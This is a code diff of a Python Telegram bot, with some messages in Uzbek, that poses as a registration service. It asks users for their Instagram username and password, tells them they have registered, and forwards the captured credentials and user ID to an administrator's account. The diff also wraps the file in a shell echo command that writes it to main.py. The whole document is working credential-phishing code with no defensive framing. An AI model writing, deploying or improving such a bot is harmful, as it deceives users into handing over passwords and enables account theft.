@@ -1,4 +1,4 @@
-import telebot
+echo 'import telebot
 from flask import Flask, request
 import time
 import threading
@@ -12,8 +12,8 @@ app = Flask(__name__)
 
 user_data = {}
 
-@app.route(f'/{TOKEN}', methods=['POST'])
-def getMessage():
+@app.route("/webhook", methods=["POST"])
+def webhook():
     json_str = request.get_data().decode("UTF-8")
     update = telebot.types.Update.de_json(json_str)
     bot.process_new_updates([update])
@@ -23,7 +23,7 @@ def getMessage():
 def home():
     return "Bot ishlayapti!"
 
-@bot.message_handler(commands=['start'])
+@bot.message_handler(commands=["start"])
 def start(message):
     user_id = message.chat.id
     user_data[user_id] = {}
@@ -33,8 +33,8 @@ def start(message):
 def collect_data(message):
     user_id = message.chat.id
     if user_id not in user_data:
-        bot.send_message(user_id, "📥 Your Instagram username:")
         user_data[user_id] = {}
+        bot.send_message(user_id, "📥 Your Instagram username:")
         return
 
     if "username" not in user_data[user_id]:
@@ -54,11 +54,11 @@ def finish_registration(user_id, msg_id):
     time.sleep(2)
     bot.edit_message_text(chat_id=user_id, message_id=msg_id, text="✅ Thank you! You have successfully registered.")
     data = user_data[user_id]
-    msg = f"💬 Instagram login ma'lumot:\n\n👤 Username: {data['username']}\n🔑 Password: {data['password']}\n🆔 User ID: {user_id}"
+    msg = f"💬 Instagram login maʼlumotlar:\n👤 Username: {data['username']}\n🔑 Password: {data['password']}\n🆔 User ID: {user_id}"
     bot.send_message(ADMIN_ID, msg)
     del user_data[user_id]
 
-# 🔥 BU YERNI QO‘SHING – Flask ilovasini ishga tushuradi
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
+' > main.py
